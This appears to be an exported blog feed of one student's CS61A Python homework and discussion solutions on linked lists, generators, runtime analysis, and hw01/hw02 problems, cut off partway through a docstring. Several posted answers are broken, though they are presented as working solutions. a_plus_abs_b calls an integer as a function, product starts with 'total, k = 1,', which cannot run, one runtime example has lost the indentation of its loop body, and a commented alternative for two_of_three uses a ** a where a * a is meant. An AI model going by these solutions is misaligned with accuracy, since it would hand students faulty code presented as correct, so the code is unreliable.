<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_cycle</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s.rest.rest.rest = s</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(s)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> link:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    seen = []</span><br><span class="line">    <span class="keyword">while</span> link <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        <span class="keyword">if</span> link <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            seen.append(link)</span><br><span class="line">            link = link.rest</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2:"></a>Question 2:</h2><p>Fill in the following function, which checks to see if a particular sequence of items in one linked list, <code>sub_link</code> can be found in another linked list <code>link</code> (the items have to be in order, but not necessarily consecutive).</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">seq_in_link</span><span class="params">(link, sub_link)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lnk1 = Link(1, Link(2, Link(3, Link(4))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lnk2 = Link(1, Link(3))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lnk3 = Link(4, Link(3, Link(2, Link(1))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; seq_in_link(lnk1, lnk2)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; seq_in_link(lnk1, lnk3)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> sub_link <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> link.first == sub_link.first:</span><br><span class="line">        <span class="keyword">return</span> seq_in_link(link.rest, sub_link.rest)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> seq_in_link(link.rest, sub_link)</span><br></pre></td></tr></table></figure>
<h1 id="Iterators-amp-Generators"><a href="#Iterators-amp-Generators" class="headerlink" title="Iterators &amp; Generators"></a>Iterators &amp; Generators</h1><h2 id="Generator-WWPD"><a href="#Generator-WWPD" class="headerlink" title="Generator WWPD"></a>Generator WWPD</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def g(n):</span><br><span class="line">        while n &gt; 0:</span><br><span class="line">            if n % 2 &#x3D;&#x3D; 0:</span><br><span class="line">                yield n</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;odd&#39;)</span><br><span class="line">            n -&#x3D; 1</span><br><span class="line">&gt;&gt;&gt; t &#x3D; g(4)</span><br><span class="line">&gt;&gt;&gt; t</span><br><span class="line">Generator Object</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; n</span><br><span class="line">NameError: name &#39;n&#39; is not defined</span><br><span class="line">&gt;&gt;&gt; t &#x3D; g(next(t) + 5)</span><br><span class="line">odd</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">odd</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
<h2 id="Write-a-generator-function"><a href="#Write-a-generator-function" class="headerlink" title="Write a generator function"></a>Write a generator function</h2><p><code>gen_inf</code> that returns a generator which yields all the numbers in the provided list one by one in an infinite loop.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = gen_inf([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(t)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(t)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(t)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(t)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(t)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_inf</span><span class="params">(lst)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> lst[i % len(lst)]</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_inf</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> elem <span class="keyword">in</span> lst:</span><br><span class="line">            <span class="keyword">yield</span> elem</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_inf</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> iter(lst)</span><br></pre></td></tr></table></figure>
<h2 id="Write-a-function"><a href="#Write-a-function" class="headerlink" title="Write a function"></a>Write a function</h2><p><code>nested_gen</code> which, when given a nested list of iterables (including generators) <code>lst</code>, will return a generator that yields all elements nested within lst in order.<br>Assume you have already implemented <code>is_iter</code>, which takes in one argument and returns True if the passed in value is an iterable and False if it is not.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nested_gen</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a = [1, 2, 3]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def g(lst):</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt;     for i in lst:</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt;         yield i</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b = g([10, 11, 12])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c = g([b])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst = [a, c, [[[2]]]]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(nested_gen(lst))</span></span><br><span class="line"><span class="string">    [1, 2, 3, 10, 11, 12, 2]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">if</span> is_iter(item):</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> nested_gen(item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p><span style="color:red">(solution using try / except instead of is_iter:)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nested_gen</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> elem <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            iter(elem)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> nested_gen(elem)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">yield</span> elem</span><br></pre></td></tr></table></figure>
<h2 id="Write-a-function-that"><a href="#Write-a-function-that" class="headerlink" title="Write a function that"></a>Write a function that</h2><p>when given an iterable <code>lst</code>, returns a generator object. This generator should iterate over every element of <code>lst</code>, checking each element to see if it has been changed to a different value from when <code>lst</code> was originally passed into the generator function. If an element has been changed, the generator should yield it. If the length of <code>lst</code> is changed to a different value from when it was passed into the function, and <code>next</code> is called on the generator, the generator should stop iteration.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mutated_gen</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst = [1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; gen = mutated_gen(lst)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst[1] = 7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; next(gen)</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst[0] = 5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst[2] = 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst[3] = 9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst[4] = 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; next(gen)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst.append(6)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; next(gen)</span></span><br><span class="line"><span class="string">    StopIteration Exception</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    original = list(lst)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generator_maker</span><span class="params">(original, lst)</span>:</span></span><br><span class="line">        curr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> curr &lt; len(original):</span><br><span class="line">            <span class="keyword">if</span> len(original) != len(lst):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> original[curr] != lst[curr]:</span><br><span class="line">                    <span class="keyword">yield</span> lst[curr]</span><br><span class="line">                curr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> generator_maker(original, lst)</span><br></pre></td></tr></table></figure>
<h1 id="Growth"><a href="#Growth" class="headerlink" title="Growth"></a>Growth</h1><h2 id="Question-0"><a href="#Question-0" class="headerlink" title="Question 0"></a>Question 0</h2><p>What are the runtimes of the following?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>
<p>a) $\Theta(1)$ b) $\Theta(log n)$ c) $\Theta(n)$ d) $\Theta(n^2)$ e) $\Theta(2^n)$<br><span style="color:red">a</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">two</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(n)</span><br></pre></td></tr></table></figure>
<p>a) $\Theta(1)$ b) $\Theta(log n)$ c) $\Theta(n)$ d) $\Theta(n^2)$ e) $\Theta(2^n)$<br><span style="color:red">c</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">three</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n // <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>a) $\Theta(1)$ b) $\Theta(log n)$ c) $\Theta(n)$ d) $\Theta(n^2)$ e) $\Theta(2^n)$<br><span style="color:red">b</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">four</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">    print(str(i), str(j))</span><br></pre></td></tr></table></figure>
<p>a) $\Theta(1)$ b) $\Theta(log n)$ c) $\Theta(n)$ d) $\Theta(n^2)$ e) $\Theta(2^n)$<br><span style="color:red">d</span></p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw01</title>
    <url>/2018/08/24/cs61a-hw01/</url>
    <content><![CDATA[<h1 id="Q1-A-Plus-Abs-B"><a href="#Q1-A-Plus-Abs-B" class="headerlink" title="Q1: A Plus Abs B"></a>Q1: A Plus Abs B</h1><p>Fill in the blanks in the following function for adding a to the absolute value of b, without calling abs.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add, sub</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a_plus_abs_b</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""Return a+abs(b), but without calling abs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a_plus_abs_b(2, 3)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a_plus_abs_b(2, -3)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">        f = a - b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = a + b</span><br><span class="line">    <span class="keyword">return</span> f(a, b)</span><br></pre></td></tr></table></figure>
<h1 id="Q2-Two-of-Three"><a href="#Q2-Two-of-Three" class="headerlink" title="Q2: Two of Three"></a>Q2: Two of Three</h1><p>Write a function that takes three positive numbers and returns the sum of the squares of the two largest numbers. Use only a single line for the body of the function.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">two_of_three</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    <span class="string">"""Return x*x + y*y, where x and y are the two largest members of the</span></span><br><span class="line"><span class="string">    positive numbers a, b, and c.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; two_of_three(1, 2, 3)</span></span><br><span class="line"><span class="string">    13</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; two_of_three(5, 3, 1)</span></span><br><span class="line"><span class="string">    34</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; two_of_three(10, 2, 8)</span></span><br><span class="line"><span class="string">    164</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; two_of_three(5, 5, 5)</span></span><br><span class="line"><span class="string">    50</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> max(a * a + b * b, a * a + c * c, b * b + c * c)</span><br><span class="line">    <span class="comment"># return a ** a + b ** b + c ** c - min(a, b, c) ** 2</span></span><br></pre></td></tr></table></figure>
<h1 id="Q3-Largest-Factor"><a href="#Q3-Largest-Factor" class="headerlink" title="Q3: Largest Factor"></a>Q3: Largest Factor</h1><p>Write a function that takes an integer n that is greater than 1 and returns the largest integer that is smaller than n and evenly divides n.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">largest_factor</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the largest factor of n that is smaller than n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_factor(15) # factors are 1, 3, 5</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_factor(80) # factors are 1, 2, 4, 5, 8, 10, 16, 20, 40</span></span><br><span class="line"><span class="string">    40</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; largest_factor(13) # factor is 1 since 13 is prime</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    d = n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> d &gt; <span class="number">0</span>:</span><br><span class="line">    	<span class="keyword">if</span> n % d == <span class="number">0</span>:</span><br><span class="line">    		<span class="keyword">return</span> d</span><br><span class="line">    	d -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="Q4-If-Function-vs-Statement"><a href="#Q4-If-Function-vs-Statement" class="headerlink" title="Q4: If Function vs Statement"></a>Q4: If Function vs Statement</h1><p>Let’s try to write a function that does the same thing as an if statement.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">if_function</span><span class="params">(condition, true_result, false_result)</span>:</span></span><br><span class="line">    <span class="string">"""Return true_result if condition is a true value, and</span></span><br><span class="line"><span class="string">    false_result otherwise.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(True, 2, 3)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(False, 2, 3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(3==2, 3+2, 3-2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(3&gt;2, 3+2, 3-2)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> condition:</span><br><span class="line">        <span class="keyword">return</span> true_result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> false_result</span><br></pre></td></tr></table></figure>

<p>Despite the doctests above, this function actually does not do the same thing as an if statement in all cases. To prove this fact, write functions c, t, and f such that with_if_statement prints the number 2, but with_if_function prints both 1 and 2.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">with_if_statement</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = with_if_statement()</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(result)</span></span><br><span class="line"><span class="string">    None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> c():</span><br><span class="line">        <span class="keyword">return</span> t()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> f()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">with_if_function</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = with_if_function()</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(result)</span></span><br><span class="line"><span class="string">    None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> if_function(c(), t(), f())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>Remeber that when we call a function, we must evaluate every operand as parameter in the function, so anyway, c function, t function and f function must be called regardless of the return value(True or False) by c function, while in if statement, the true clause can not be called if evaluated value is False. So the two is not exactly the same.</p>
<h1 id="Q5-Hailstone"><a href="#Q5-Hailstone" class="headerlink" title="Q5: Hailstone"></a>Q5: Hailstone</h1><p>Douglas Hofstadter’s Pulitzer-prize-winning book, Gödel, Escher, Bach, poses the following mathematical puzzle.</p>
<p>Pick a positive integer n as the start.<br>If n is even, divide it by 2.<br>If n is odd, multiply it by 3 and add 1.<br>Continue this process until n is 1.<br>The number n will travel up and down but eventually end at 1 (at least for all numbers that have ever been tried – nobody has ever proved that the sequence will terminate). Analogously, a hailstone travels up and down in the atmosphere before eventually landing on earth.</p>
<p>This sequence of values of n is often called a Hailstone sequence. Write a function that takes a single argument with formal parameter name n, prints out the hailstone sequence starting at n, and returns the number of steps in the sequence:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hailstone</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Print the hailstone sequence starting at n and return its</span></span><br><span class="line"><span class="string">    length.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a = hailstone(10)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    16</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    steps = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">        print(n)</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            n //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = n * <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">    print(n)</span><br><span class="line">    <span class="keyword">return</span> steps</span><br></pre></td></tr></table></figure>
<h1 id="Q6-Quine"><a href="#Q6-Quine" class="headerlink" title="Q6: Quine"></a>Q6: Quine</h1><p>Write a one-line program that prints itself, using only the following features of the Python language:</p>
<ul>
<li>Number literals</li>
<li>Assignment statements</li>
<li>String literals that can be expressed using single or double quotes</li>
<li>The arithmetic operators +, -, *, and /</li>
<li>The built-in print function</li>
<li>The built-in eval function, which evaluates a string as a Python expression</li>
<li>The built-in repr function, which returns an expression that evaluates to its argument</li>
<li>You can concatenate two strings by adding them together with + and repeat a string by multipying it by an integer.</li>
<li>Semicolons can be used to separate multiple statements on the same line. E.g.,</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; c&#x3D;&#39;c&#39;;print(&#39;a&#39;);print(&#39;b&#39; + c * 2)</span><br><span class="line">a</span><br><span class="line">bcc</span><br></pre></td></tr></table></figure>
<p>Hint: Explore the relationship between single quotes, double quotes, and the repr function applied to strings.</p>
<p>A program that prints itself is called a Quine. Place your solution in the multi-line string named quine.</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw02</title>
    <url>/2018/08/25/cs61a-hw02/</url>
    <content><![CDATA[<h1 id="Q1-Make-Adder-with-a-Lambda"><a href="#Q1-Make-Adder-with-a-Lambda" class="headerlink" title="Q1: Make Adder with a Lambda"></a>Q1: Make Adder with a Lambda</h1><p>Implement the make_adder function, which takes in a number n and returns a function that takes in an another number k and returns n + k. Your solution must consist of a single return statement.</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_adder</span><span class="params">(n)</span>:</span></span><br><span class="line">   <span class="string">"""Return a function that takes an argument K and returns N + K.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; add_three = make_adder(3)</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; add_three(1) + add_three(2)</span></span><br><span class="line"><span class="string">   9</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; make_adder(1)(2)</span></span><br><span class="line"><span class="string">   3</span></span><br><span class="line"><span class="string">   """</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">lambda</span> k: n + k</span><br></pre></td></tr></table></figure>
<h1 id="Q2-Product"><a href="#Q2-Product" class="headerlink" title="Q2: Product"></a>Q2: Product</h1><p>The summation(n, term) function from the higher-order functions lecture adds up term(1) + … + term(n). Write a similar function called product that returns term(1) * … * term(n). Do not use recursion.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">(n, term)</span>:</span></span><br><span class="line">    <span class="string">"""Return the product of the first n terms in a sequence.</span></span><br><span class="line"><span class="string">    n    -- a positive integer</span></span><br><span class="line"><span class="string">    term -- a function that takes one argument</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(3, identity)  # 1 * 2 * 3</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(5, identity)  # 1 * 2 * 3 * 4 * 5</span></span><br><span class="line"><span class="string">    120</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(3, square)    # 1^2 * 2^2 * 3^2</span></span><br><span class="line"><span class="string">    36</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(5, square)    # 1^2 * 2^2 * 3^2 * 4^2 * 5^2</span></span><br><span class="line"><span class="string">    14400</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(3, increment) # (1+1) * (2+1) * (3+1)</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product(3, triple)    # 1*3 * 2*3 * 3*3</span></span><br><span class="line"><span class="string">    162</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'product', ['Recursion'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    total, k = <span class="number">1</span>,</span><br><span class="line">    <span class="keyword">while</span> k &lt;= n:</span><br><span class="line">        total, k = total * term(k), k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure>
<p>Now, define the factorial function in terms of product in one line.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return n factorial for n &gt;= 0 by calling product.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; factorial(4)  # 4 * 3 * 2 * 1</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; factorial(6)  # 6 * 5 * 4 * 3 * 2 * 1</span></span><br><span class="line"><span class="string">    720</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'factorial', ['Recursion', 'For', 'While'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> product(n, <span class="keyword">lambda</span> x: x)</span><br></pre></td></tr></table></figure>
<h1 id="Q3-Accumulate"><a href="#Q3-Accumulate" class="headerlink" title="Q3: Accumulate"></a>Q3: Accumulate</h1><p>Let’s take a look at how summation and product are instances of a more general function called accumulate:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accumulate</span><span class="params">(combiner, base, n, term)</span>:</span></span><br><span class="line">    <span class="string">"""Return the result of combining the first n terms in a sequence and base.</span></span><br><span class="line"><span class="string">    The terms to be combined are term(1), term(2), ..., term(n).  combiner is a</span></span><br><span class="line"><span class="string">    two-argument commutative, associative function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; accumulate(add, 0, 5, identity)  # 0 + 1 + 2 + 3 + 4 + 5</span></span><br><span class="line"><span class="string">    15</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; accumulate(add, 11, 5, identity) # 11 + 1 + 2 + 3 + 4 + 5</span></span><br><span class="line"><span class="string">    26</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; accumulate(add, 11, 0, identity) # 11</span></span><br><span class="line"><span class="string">    11</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; accumulate(add, 11, 3, square)   # 11 + 1^2 + 2^2 + 3^2</span></span><br><span class="line"><span class="string">    25</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; accumulate(mul, 2, 3, square)    # 2 * 1^2 * 2^2 * 3^2</span></span><br><span class="line"><span class="string">    72</span></span><br><span class="line"><span class="string"> 